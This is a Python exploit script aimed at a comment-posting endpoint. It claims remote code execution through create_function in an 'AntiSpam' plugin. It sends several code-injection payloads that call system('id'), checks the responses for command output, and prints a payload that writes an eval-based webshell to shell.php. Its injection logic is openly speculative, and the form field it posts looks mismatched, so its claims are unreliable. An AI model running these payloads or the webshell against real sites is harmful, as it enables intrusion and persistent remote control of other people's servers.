#!/usr/bin/env python3
"""
AntiSpam create_function RCE Exploit
CVSS: 7.5 High

Target: AntiSpam/Plugin.php (line 75-76)
Vulnerability: Code execution via create_function with user-controlled input

Usage:
    python3 antispam_rce.py <comment_post_url> [command]

Example:
    python3 antispam_rce.py http://target.com/wp-comments-post.php "whoami"
"""

import requests
import sys

class AntiSpamRCE:
    def __init__(self, target_url):
        self.target = target_url
        self.session = requests.Session()
    
    def test_vulnerability(self, command="phpinfo()"):
        """Test if the create_function vulnerability is exploitable"""
        
        print(f"[*] Target: {self.target}")
        print(f"[*] Testing create_function RCE...")
        print("")
        
        # The vulnerable code:
        # ob_start(create_function('$input','return preg_replace("...", "...", $input);'));
        #
        # If we can inject into $input (comment content), we might escape
        # the function and execute code.
        
        # Payloads to try
        payloads = [
            # Basic injection attempts
            "*/system('id');/*",
            "']; system('id'); /*",
            "1', '', 1); system('id');//",
        ]
        
        for i, payload in enumerate(payloads, 1):
            print(f"[*] Payload {i}: {payload[:50]}...")
            
            try:
                # This would be sent as comment text
                r = self.session.post(self.target, 
                                     data={'text': payload},
                                     timeout=10)
                
                # Check if command output appears
                if 'uid=' in r.text or 'www-data' in r.text:
                    print(f"[+] VULNERABLE! Command output detected")
                    return payload
                    
            except Exception as e:
                print(f"[-] Error: {e}")
        
        print("")
        print("[*] Note: create_function is deprecated in PHP 7.2+")
        print("[*] Exploitation may depend on PHP version and configuration")
        
        return None
    
    def generate_payload(self, command):
        """Generate a webshell payload"""
        
        # This payload writes a webshell
        webshell_payload = "*/file_put_contents('shell.php','<?php @eval($_POST[x]);?>');/*"
        
        print(f"[*] Webshell payload: {webshell_payload}")
        print(f"[*] After injection, check for: shell.php in plugin directory")
        print("")
        print(f"[*] Alternative: Direct command execution payload:")
        print(f"    */system('{command}');/*")
        
        return webshell_payload

def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <comment_post_url> [command]")
        print(f"Example: {sys.argv[0]} http://target.com/wp-comments-post.php whoami")
        sys.exit(1)
    
    target = sys.argv[1]
    command = sys.argv[2] if len(sys.argv) > 2 else "whoami"
    
    exploit = AntiSpamRCE(target)
    
    print("[*] AntiSpam create_function RCE Test")
    print("="*50)
    
    result = exploit.test_vulnerability(command)
    
    if result:
        print(f"\n[+] Vulnerability confirmed!")
    else:
        print(f"\n[-] Could not confirm vulnerability (may be patched)")
    
    print("\n[*] Generating payload...")
    exploit.generate_payload(command)

if __name__ == "__main__":
    main()
